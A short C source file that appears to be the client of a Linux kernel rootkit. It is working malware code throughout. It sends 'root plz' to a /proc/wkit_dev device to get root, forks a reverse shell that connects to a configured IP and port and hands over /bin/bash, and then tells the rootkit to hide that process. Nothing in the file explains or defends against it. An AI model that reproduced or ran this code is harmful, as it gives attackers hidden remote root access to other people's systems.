#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#include "options.h"

bool send_cmd(char* dev, char* cmd){
	bool res = false;
	int fd = open(dev, O_RDWR);

	if(write(fd, cmd, strlen(cmd))<0)
			goto END;

	res = true;
END:
	close(fd);
	return res;
}

void launch(){
	struct sockaddr_in revsockaddr;
	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	
	revsockaddr.sin_family = AF_INET;       
	revsockaddr.sin_port = htons(PORT);
	revsockaddr.sin_addr.s_addr = inet_addr(IP);

	connect(sockt, (struct sockaddr *) &revsockaddr, 
	sizeof(revsockaddr));
	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	char* const argv[] = {"/bin/bash", NULL};
	execve("/bin/bash", argv, NULL);
}

int main(){
	pid_t self = getpid();
	if(kill(self, SIGNAL)<0)
		return EXIT_FAILURE;

	char dev[strlen(USUM)+20];
	sprintf(dev, "/proc/wkit_dev%s", USUM);

	send_cmd(dev, "root plz");
	if(getuid()!=0)
		return EXIT_FAILURE;
	
	pid_t fpid = fork();
	if(fpid == 0){
		launch();
	}

	char proc_cmd[30];
	sprintf(proc_cmd, "proc %d", fpid);
	send_cmd(dev, proc_cmd);
	return EXIT_SUCCESS;
}
